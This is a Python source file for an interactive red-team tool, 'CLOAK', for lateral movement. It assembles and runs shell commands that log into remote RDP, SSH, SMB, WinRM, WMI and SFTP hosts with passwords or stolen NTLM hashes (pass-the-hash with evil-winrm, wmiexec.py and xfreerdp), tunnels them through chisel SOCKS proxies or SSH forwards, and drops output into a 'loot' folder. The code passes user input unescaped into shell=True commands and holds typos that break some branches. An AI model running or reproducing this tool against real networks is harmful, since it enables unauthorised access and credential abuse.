import os
import subprocess
import readline
from questionary import Style, select

def list_ssh_keys(directory="/root/.ssh"):
    """List available SSH key files in the specified directory."""
    try:
        files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
        if not files:
            print(f"No SSH keys found in {directory}.")
            return []
        return files
    except FileNotFoundError:
        print(f"The directory {directory} does not exist.")
        return []
    except PermissionError:
        print(f"Permission denied to access {directory}.")
        return []

def select_ssh_key(directory="/root/.ssh"):
    """Prompt the user to select an SSH key from the available files."""
    keys = list_ssh_keys(directory)
    if not keys:
        return None
    return select(
        "Select your SSH private key:",
        choices=keys,
        style=custom_style
    ).ask()

def winrm_masq():
    print("Initializing WinRM Masquerade...")
    winrm_target = input("Enter WinRM Target IP: ")
    winrm_username = input("Enter WinRM Username: ")

    # Prompt To Ask user if they want to tunnel the question
    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()
    # Set Directory to be loot
    loot_directory = "/app/loot"
    try:
        os.chdir(loot_directory)
        print("Changed working directory to:", os.getcwd())
    except FileNotFoundError:
        print("Error: Directory does not exist:", loot_directory)
    except PermissionError:
        print("Error: You do not have permissions to access this directory.")

    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()

        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Server IP: ")
                socks_port = input("Enter SOCKS Server Port: ")
                # Prompt To Choose Password or Hashes for Authentication
                choice = select(
                    "How do you want to authenticate?: ",
                     choices=["Password", "Hashes"],
                     style=custom_style
                 ).ask()

                match choice:    
                    case "Password":
                        winrm_password = input("Enter WinRM Password: ")
                        command = (
                            f"chisel client {socks_ip}:{socks_port} R:socks & "
                            f"sleep 5 && evil-winrm -i {winrm_target} -u {winrm_username} -p {winrm_password}"
                        )

                    case "Hashes":
                        winrm_hash = input("Enter NTLM Hash: ")
                        command = (
                            f"chisel client {socks_ip}:{socks_port} R:socks & "
                            f"sleep 5 && evil-winrm -i {winrm_target} -u {winrm_username} -H {winrm_hash}"
                        )

            case "SSH Tunnel":
                ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
                ssh_tunnel_user = input("Enter SSH Username for the Tunnel: ")

                tunnel_auth_method = select(
                    "Select SSH Authentication Method for the Tunnel:",
                    choices=["Password", "SSH Key"],
                    style=custom_style
                ).ask()
                if tunnel_auth_method == "Password":
                    tunnel_password = input("Enter SSH Password for the Tunnel: ")
                    ssh_command_prefix = f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                    # Case Statement for WinRM Password or Hash Choice
                    choice = select(
                        "How do you want to authenticate?: ",
                        choices=["Password", "Hashes"],
                        style=custom_style
                    ).ask()

                    match choice:    
                        case "Password":
                            winrm_password = input("Enter WinRM Password: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:5985:{winrm_target}:5985 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && evil-winrm -i 127.0.0.1 -u {winrm_username} -p {winrm_password}"
                            )

                        case "Hashes":
                            winrm_hash = input("Enter NTLM Hash: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:5985:{winrm_target}:5985 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && evil-winrm -i 127.0.0.1 -u {winrm_username} -H {winrm_hash}"
                            )

                elif tunnel_auth_method == "SSH Key":
                    tunnel_key_file = select_ssh_key()
                    if not tunnel_key_file:
                        print("No valid SSH key selected. Exiting.")
                        return
                    # Case Statement for WinRM Password or Hash Choice
                    ssh_command_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                    # Ask if User Wants to Auth to WinRM via Password or Hash
                    choice = select(
                        "How do you want to authenticate?: ",
                        choices=["Password", "Hashes"],
                        style=custom_style
                    ).ask()

                    match choice:    
                        case "Password":
                            winrm_password = input("Enter WinRM Password: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:5985:{winrm_target}:5985 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && evil-winrm -i 127.0.0.1 -u {winrm_username} -p {winrm_password}"
                            )

                        case "Hashes":
                            winrm_hash = input("Enter NTLM Hash: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:5985:{winrm_target}:5985 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && evil-winrm -i 127.0.0.1 -u {winrm_username} -H {winrm_hash}"
                            )

                    # Command for SSH Key/WinRM Tunneling Combined
                    #command = (
                    #    f"{ssh_command_prefix} -N -L 127.0.0.1:5985:{winrm_target}:5985 "
                    #    f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                    #    f"sleep 5 && evil-winrm -i 127.0.0.1 -u {winrm_username} -H {winrm_hash}"
                    #)

    else: 
    # Prompt to Choose Password or Hashes for Authentication
        choice = select(
            "How do you want to authenticate?: ",
            choices=["Password", "Hashes"],
            style=custom_style
        ).ask()

        match choice:
            case "Password":
                winrm_password = input("Enter WinRM Password: ")
                command = f"evil-winrm -i {winrm_target} -u {winrm_username} -p {winrm_password}"
            case "Hashes":
                winrm_hash = input("Enter NTLM Hash: ")
                command = f"evil-winrm -i {winrm_target} -u {winrm_username} -H {winrm_hash}"

    print("Running command:", command)
    subprocess.run(command, shell=True)

def smb_masq():
    print("Initializing SMB masquerade...")
    smb_username = input("Enter SMB Username: ")
    smb_target = input("Enter Target IP of SMB Target: ")

    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()
    # Set Directory to be loot
    loot_directory = "/app/loot"
    try:
        os.chdir(loot_directory)
        print("Changed working directory to:", os.getcwd())
    except FileNotFoundError:
        print("Error: Directory does not exist:", loot_directory)
    except PermissionError:
        print("Error: You do not have permissions to access this directory.")

    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()

        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Server IP: ")
                socks_port = input("Enter SOCKS Server Port: ")

                # Ask User to Authenticate by Password or NTLM Authentication
                choice = select(
                    "How do you want to authenticate?: ",
                    choices=["Password", "Hashes"],
                    style=custom_style
                ).ask()

                # Case statement to handle logic for password or hashes
                match choice:
                    case "Password":
                        smb_password = input("Enter SMB Password: ")
                        command = (
                            f"chisel client {socks_ip}:{socks_port} R:socks & "
                            f"sleep 5 && python /app/slinger/build/scripts-3.12/slinger.py -host {smb_target} --username {smb_username} --password {smb_password}"
                        )

                    case "Hashes":
                        smb_hash = input("Enter NTLM Hash: ")
                        command = (
                            f"chisel client {socks_ip}:{socks_port} R:socks & "
                            f"sleep 5 && python /app/slinger/build/scripts-3.12/slinger.py -host {smb_target} --username {smb_username} -ntlm :{smb_hash}"
                         )

            case "SSH Tunnel":
                ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
                ssh_tunnel_user = input("Enter SSH Username for the Tunnel: ")

                tunnel_auth_method = select(
                    "Select SSH Authentication Method for the Tunnel:",
                    choices=["Password", "SSH Key"],
                    style=custom_style
                ).ask()
                if tunnel_auth_method == "Password":
                    tunnel_password = input("Enter SSH Password for the Tunnel: ")
                    ssh_command_prefix = f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                    # Prompt User for Password or NTLM Authentication
                    choice = select(
                        "How do you want to authenticate?: ",
                        choices=["Password", "Hashes"],
                        style=custom_style
                    ).ask()
                    
                    # Password Logic
                    match choice:    
                        case "Password":
                            smb_password = input("Enter SMB Password: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:445:{smb_target}:445 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && python /app/slinger/build/scripts-3.12/slinger.py -host 127.0.0.1 --username {smb_username} --password {smb_password}"
                            )
                        case "Hashes":
                            smb_hash = input("Enter NTLM Hash: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:445:{smb_target}:445 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && python /app/slinger/build/scripts-3.12/slinger.py -host 127.0.0.1 --username {smb_username} -ntlm :{smb_hash}"
                            )

                elif tunnel_auth_method == "SSH Key":
                    tunnel_key_file = select_ssh_key()
                    if not tunnel_key_file:
                        print("No valid SSH key selected. Exiting.")
                        return
                    ssh_command_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

                    # Prompt Use for Password or Hash Authentication
                    choice = select(
                        "How do you want to authenticate?: ",
                        choices=["Password", "Hashes"],
                        style=custom_style
                    ).ask()
                    
                    # Password Logic
                    match choice:    
                        case "Password":
                            smb_password = input("Enter SMB Password: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:445:{smb_target}:445 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && python /app/slinger/build/scripts-3.12/slinger.py -host 127.0.0.1 --usernameu {smb_username} --password {smb_password}"
                            )
                        case "Hashes":
                            smb_hash = input("Enter NTLM Hash: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:445:{smb_target}:445 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && python /app/slinger/build/scripts-3.12/slinger.py -host 127.0.0.1 --username {smb_username} -ntlm :{smb_hash}"
                            )
    else: 
        # Prompt Use for Password or Hash Authenitcation
        choice = select(
            "How do you want to authenticate?: ",
            choices=["Password", "Hashes"],
            style=custom_style
        ).ask()

        # Case statement to handle logic for password or hashes
        match choice:
            case "Password":
                smb_password = input("Enter SMB Password: ")
                command = f"python /app/slinger/build/scripts-3.12/slinger.py -host {smb_target} --username {smb_username} --password {smb_password}"
            case "Hashes":
                smb_hash = input("Enter NTLM Hash: ")
                command = f"python /app/slinger/build/scripts-3.12/slinger.py -host {smb_target} --username {smb_username} -ntlm :{smb_hash}"
    
    print("Running command:", command)
    subprocess.run(command, shell=True)


def rdp_masq():
    print("Initializing RDP masquerade...")
    rdp_username = input("Enter RDP Username: ")
    rdp_target = input("Enter Target IP of RDP Target: ")

    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()

    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()

        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Server IP: ")
                socks_port = input("Enter SOCKS Server Port: ")
                # Prompt for Passowrd or NTLM Hash Authentication
                choice = select(
                    "How do you want to authenticate?: ",
                     choices=["Password", "Hashes"],
                     style=custom_style
                ).ask()

                # Logic
                match choice:
                  case "Password":
                     rdp_password = input("Enter RDP Password: ")
                     command = (
                        f"chisel client {socks_ip}:{socks_port} R:socks & "
                        f"xfreerdp /cert-ignore /u:{rdp_username} /p:{rdp_password} /v:{rdp_target}"
                     )
                  case "Hashes":
                    rdp_hash = input("Enter NTLM Hash: ")
                    command = (
                        f"chisel client {socks_ip}:{socks_port} R:socks & "
                        f"xfreerdp /cert-ignore /u:{rdp_username} /pth:{rdp_hash} /v:{rdp_target}"
                    )
            case "SSH Tunnel":
                ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
                ssh_tunnel_user = input("Enter SSH Username for the Tunnel: ")

                tunnel_auth_method = select(
                    "Select SSH Authentication Method for the Tunnel:",
                    choices=["Password", "SSH Key"],
                    style=custom_style
                ).ask()

                if tunnel_auth_method == "Password":
                    tunnel_password = input("Enter SSH Password for the Tunnel: ")
                    ssh_command_prefix = f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                    # Prompt User for Password or NTLM Authentication
                    choice = select(
                        "How do you want to authenticate?: ",
                        choices=["Password", "Hashes"],
                        style=custom_style
                    ).ask()

                    # Password Logic
                    match choice:    
                        case "Password":
                            rdp_password = input("Enter SMB Password: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:3389:{rdp_target}:3389 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && xfreerdp /cert-ignore /u:{rdp_username} /p:{rdp_password} /v:{rdp_target}"
                            )
                        case "Hashes":
                            rdp_hash = input("Enter NTLM Hash: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:3389:{rdp_target}:3389 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && xfreerdp /cert-ignore /u:{rdp_username} /pth:{rdp_hash} /v:{rdp_target}"
                            )
                elif tunnel_auth_method == "SSH Key":
                    tunnel_key_file = select_ssh_key()
                    if not tunnel_key_file:
                        print("No valid SSH key selected. Exiting.")
                        return
                    ssh_command_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                    # Prompt User for Password or NTLM Authentication
                    choice = select(
                        "How do you want to authenticate?: ",
                        choices=["Password", "Hashes"],
                        style=custom_style
                    ).ask()
                    # Password Logic
                    match choice:    
                        case "Password":
                            rdp_password = input("Enter SMB Password: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:3389:{rdp_target}:3389 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && xfreerdp /cert-ignore /u:{rdp_username} /p:{rdp_password} /v:{rdp_target}"
                            )
                        case "Hashes":
                            rdp_hash = input("Enter NTLM Hash: ")
                            command = (
                                f"{ssh_command_prefix} -N -L 127.0.0.1:3389:{rdp_target}:3389 "
                                f"{ssh_tunnel_user}@{ssh_tunnel_ip} -p {ssh_tunnel_port} & "
                                f"sleep 5 && xfreerdp /cert-ignore /u:{rdp_username} /pth:{rdp_hash} /v:{rdp_target}"
                            )

            case "TCP Tunnel":
                print("TCP Tunnel module is still under development.")
                return
            case "Exit":
                print("Exiting tunnel setup.")
                return
            case _:
                print("Invalid choice. Exiting RDP masquerade setup.")
                return
    else:
        # Prompt for Passowrd or NTLM Hash Authentication
        choice = select(
            "How do you want to authenticate?: ",
            choices=["Password", "Hashes"],
            style=custom_style
        ).ask()

        # Logic
        match choice:
            case "Password":
                rdp_password = input("Enter RDP Password: ")
                command = f"xfreerdp /cert-ignore /u:{rdp_username} /p:{rdp_password} /v:{rdp_target}"
            case "Hashes":
                rdp_hash = input("Enter NTLM Hash: ")
                command = f"xfreerdp /cert-ignore /u:{rdp_username} /pth:{rdp_hash} /v:{rdp_target}"

    print("Running command:", command)
    subprocess.run(command, shell=True)


def ssh_masq():
    print("Initializing SSH masquerade...")

    ssh_target_ip = input("Enter Target IP of SSH Target: ")
    ssh_target_port = input("Enter the Target's SSH Port (default: 22): ").strip() or "22"
    target_username = input("Enter SSH Username for the Target: ")

    target_auth_method = select(
        "Select SSH Authentication Method for the Target:",
        choices=["Password", "SSH Key"],
        style=custom_style
    ).ask()

    if target_auth_method == "Password":
        target_password = input("Enter SSH Password for the Target: ")
        target_ssh_prefix = f"sshpass -p '{target_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
    elif target_auth_method == "SSH Key":
        target_key_file = select_ssh_key()
        if not target_key_file:
            print("No valid SSH key selected for the Target. Exiting.")
            return
        target_ssh_prefix = f"ssh -i /root/.ssh/{target_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()

    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()

        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Proxy Server IP: ")
                socks_port = input("Enter SOCKS Proxy Server Port: ")
                command = (
                    f"chisel client {socks_ip}:{socks_port} R:socks & "
                    f"sleep 5 && {target_ssh_prefix} {target_username}@{ssh_target_ip} -p {ssh_target_port} /bin/bash"
                )
            case "SSH Tunnel":
                ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
                tunnel_username = input("Enter SSH Username for the Tunnel: ")

                tunnel_auth_method = select(
                    "Select SSH Authentication Method for the Tunnel:",
                    choices=["Password", "SSH Key"],
                    style=custom_style
                ).ask()

                if tunnel_auth_method == "Password":
                    tunnel_password = input("Enter SSH Password for the Tunnel: ")
                    tunnel_ssh_prefix = f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                elif tunnel_auth_method == "SSH Key":
                    tunnel_key_file = select_ssh_key()
                    if not tunnel_key_file:
                        print("No valid SSH key selected for the Tunnel. Exiting.")
                        return
                    tunnel_ssh_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

                command = (
                    f"{tunnel_ssh_prefix} -L 127.0.0.1:2222:{ssh_target_ip}:{ssh_target_port} "
                    f"{tunnel_username}@{ssh_tunnel_ip} -p {ssh_tunnel_port} -f sleep 5 && "
                    f"{target_ssh_prefix} {target_username}@127.0.0.1 -p 2222 /bin/bash"
                )
            case "TCP Tunnel":
                print("TCP Tunnel is still under development.")
                return
            case "Exit":
                print("Exiting SSH masquerade setup.")
                return
            case _:
                print("Invalid choice. Exiting SSH masquerade setup.")
                return
    else:
        command = (
            f"{target_ssh_prefix} {target_username}@{ssh_target_ip} -p {ssh_target_port} /bin/bash"
        )

    print("Running command:", command)
    subprocess.run(command, shell=True)

def sftp_masq():
    print("Initializing SFTP Masquerade...")
    sftp_username = input("Enter SFTP Username: ")
    sftp_target = input("Enter SFTP Target IP: ")
    sftp_target_port = input("Enter the Target's SFTP Port (default: 22): ").strip() or "22"

    # Set Directory to be loot
    loot_directory = "/app/loot"
    try:
        os.chdir(loot_directory)
        print("Changed working directory to:", os.getcwd())
    except FileNotFoundError:
        print("Error: Directory does not exist:", loot_directory)
    except PermissionError:
        print("Error: You do not have permissions to access this directory.")

    # Choose Authentication Method by Password or SSH Key
    target_auth_method = select(
        "Select SSH Authentication Method for the Target:",
        choices=["Password", "SSH Key"],
        style=custom_style
    ).ask()

    if target_auth_method == "Password":
        target_password = input("Enter SFTP Password for the Target: ")
        target_ssh_prefix = f"sshpass -p '{target_password}' sftp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
    elif target_auth_method == "SSH Key":
        target_key_file = select_ssh_key()
        if not target_key_file:
            print("No valid SFTP key selected for the Target. Exiting.")
            return
        target_ssh_prefix = f"sftp-i /root/.ssh/{target_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

    # Tunneling Options
    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()
    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()

        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Proxy Server IP: ")
                socks_port = input("Enter SOCKS Proxy Server Port: ")
                command = (
                    f"chisel client {socks_ip}:{socks_port} R:socks & "
                    f"sleep 5 && {target_ssh_prefix} -P {sftp_target_port} {sftp_username}@{sftp_target}"
                )
            case "SSH Tunnel":
                ssh_tunnel_ip = input("Enter SSH Tunnel IP: ")
                ssh_tunnel_port = input("Enter SSH Tunnel Port (default: 22): ").strip() or "22"
                tunnel_username = input("Enter SSH Username for the Tunnel: ")

                tunnel_auth_method = select(
                    "Select SSH Authentication Method for the Tunnel:",
                    choices=["Password", "SSH Key"],
                    style=custom_style
                ).ask()

                if tunnel_auth_method == "Password":
                    tunnel_password = input("Enter SSH Password for the Tunnel: ")
                    tunnel_ssh_prefix = f"sshpass -p '{tunnel_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                elif tunnel_auth_method == "SSH Key":
                    tunnel_key_file = select_ssh_key()
                    if not tunnel_key_file:
                        print("No valid SSH key selected for the Tunnel. Exiting.")
                        return
                    tunnel_ssh_prefix = f"ssh -i /root/.ssh/{tunnel_key_file} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"
                command = (
                    f"{tunnel_ssh_prefix} "
                    f"-L 127.0.0.1:2222:{sftp_target}:{sftp_target_port} "
                    f"{tunnel_username}@{ssh_tunnel_ip} -p {ssh_tunnel_port} -f sleep 5 && "
                    f"sshpass -p '{target_password}' sftp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                    f"-P 2222 {sftp_username}@127.0.0.1"
                )
            case "TCP Tunnel":
                print("TCP Tunnel is still under development.")
                return
            case "Exit":
                print("Exiting SSH masquerade setup.")
                return
            case _:
                print("Invalid choice. Exiting SSH masquerade setup.")
                return
    else:
        command = (
            f"{target_ssh_prefix} -P {sftp_target_port} {sftp_username}@{sftp_target}"
        )
    print("Running command:", command)
    subprocess.run(command, shell=True)

def wmi_masq():
    print("Initializing WMI masquerade...")
    wmi_target = input("Enter WMI Target IP: ")
    wmi_username = input("Enter WMI Username: ")

    proxy_question = input("Do you have to tunnel this connection through an intermediary? (Y/N): ").strip().lower()

    if proxy_question == "y":
        tunnel_choice = select(
            "Tunnel Type:",
            choices=["SOCKS Proxy", "SSH Tunnel", "TCP Tunnel", "Exit"],
            style=custom_style
        ).ask()
        match tunnel_choice:
            case "SOCKS Proxy":
                socks_ip = input("Enter SOCKS Server IP: ")
                socks_port = input("Enter SOCKS Server Port: ")
                # Prompt for Passowrd or NTLM Hash Authentication
                choice = select(
                    "How do you want to authenticate?: ",
                     choices=["Password", "Hashes"],
                     style=custom_style
                ).ask()
                # Prompt for Password or NTLM Hash Authentication
                match choice:
                    case "Password":
                        wmi_password = input("Enter WMI Password: ")
                        command = (
                            f"chisel client {socks_ip}:{socks_port} R:socks & "
                            f"python /usr/local/bin/wmiexec.py '{wmi_username}:{wmi_password}@{wmi_target}'"
                        )
                    case "Hashes":
                        wmi_lm_hash = input("Enter LM Hash: ")
                        wmi_nt_hash = input("Enter NT Hash: ")
                        command = (
                            f"chisel client {socks_ip}:{socks_port} R:socks & "
                            f"python /usr/local/bin/wmiexec.py {wmi_username}@{wmi_target} -hashes {wmi_lm_hash}:{wmi_nt_hash}"
                        )
            case "SSH Tunnel":
                print("\033[31mNot Supported with this module. Module requires ports 135, 445, 50000-51000 to be open. Recommended to use Proxy...\033[0m")
                return
    else:
        # Prompt for Password or NTLM Hash Authentication
        choice = select(
            "How do you want to authenticate?: ",
            choices=["Password", "Hashes"],
            style=custom_style
        ).ask()
        # Logic
        match choice:
            case "Password":
                wmi_password = input("Enter WMI Password: ")
                command = f"python /usr/local/bin/wmiexec.py '{wmi_username}:{wmi_password}@{wmi_target}'"
            case "Hashes":
                wmi_lm_hash = input("Enter LM Hash: ")
                wmi_nt_hash = input("Enter NT Hash: ")
                command = f"python /usr/local/bin/wmiexec.py {wmi_username}@{wmi_target} -hashes {wmi_lm_hash}:{wmi_nt_hash}"

    print("Running command:", command)
    subprocess.run(command, shell=True)


def loot():
    # Define Loot Directory
    directory = "/app"
    # Check if Directory exists
    if not os.path.exists(directory):
        print("Directory '{directory}' does not exist.")
        return
    else:
        print("loot directory initialized")

    files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
    print("\033[32m[+] Ensuring Loot files have been created")
    print(files)

# Define custom style
custom_style = Style([("choice", "fg:blue")])

ascii_art = """
╔═══════════════════════════════════════════════════════╗
║  _________ .____    ________      _____   ____  __.   ║
║  \_   ___ \|    |   \_____  \    /  _  \ |    |/ _|   ║
║  /    \  \/|    |    /   |   \  /  /_\  \|      <     ║
║  \     \___|    |___/    |    \/    |    \    |  \    ║
║   \______  /_______ \_______  /\____|__  /____|__ \   ║
║          \/        \/       \/         \/        \/   ║
╚═══════════════════════════════════════════════════════╝
"""
print(f"\033[35m{ascii_art}\033[0m")

choice = select(
    "Select a Masquerade Type:",
    choices=["RDP", "SSH", "SMB", "WinRM", "WMI", "SFTP", "Exit"],
    style=custom_style
).ask()

if choice == "RDP":
    rdp_masq()
elif choice == "SSH":
    ssh_masq()
elif choice == "SMB":
    smb_masq()
elif choice == "WinRM":
    winrm_masq()
elif choice == "WMI":
    wmi_masq()
elif choice == "SFTP":
    sftp_masq()
elif choice == "Exit":
    print("Exiting the program. Goodbye!")
